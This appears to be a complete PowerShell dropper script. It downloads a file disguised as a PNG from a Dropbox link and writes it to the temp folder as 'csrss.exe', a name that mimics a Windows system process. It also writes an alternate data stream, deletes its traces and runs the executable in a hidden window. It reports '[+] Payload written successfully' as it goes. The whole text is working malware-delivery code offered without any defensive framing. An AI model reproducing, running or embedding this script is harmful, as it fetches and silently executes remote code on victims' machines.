$Url = "https://dl.dropbox.com/scl/fi/va39teijma6k4inz0zi17/csrss.png?rlkey=pdo4n2ujwfwwb27pqp3gtlrc3&st=a60zm696&dl=1"

$JpgPath = "$env:TEMP\thumb_cache_$(Get-Random).jpg"
$ExePath = "$env:TEMP\csrss.exe"

try {
    Write-Output ""
    $wc = New-Object System.Net.WebClient
    $wc.DownloadFile($Url, $JpgPath)
    $bytes = [System.IO.File]::ReadAllBytes($JpgPath)
    [System.IO.File]::WriteAllBytes($ExePath, $bytes)
    $AdsPath = "$env:TEMP\update.jpg:Zone.Identifier"
    try { [System.IO.File]::WriteAllBytes($AdsPath, $bytes) } catch {}
    Remove-Item $JpgPath -Force -ErrorAction SilentlyContinue

    Write-Output "[+] Payload written successfully → $ExePath"
    Start-Process -FilePath $ExePath -WindowStyle Hidden -ErrorAction Stop

    Write-Output "[+] Execution attempted"
} 
catch {
    Write-Output "[-] Error: $($_.Exception.Message)"
}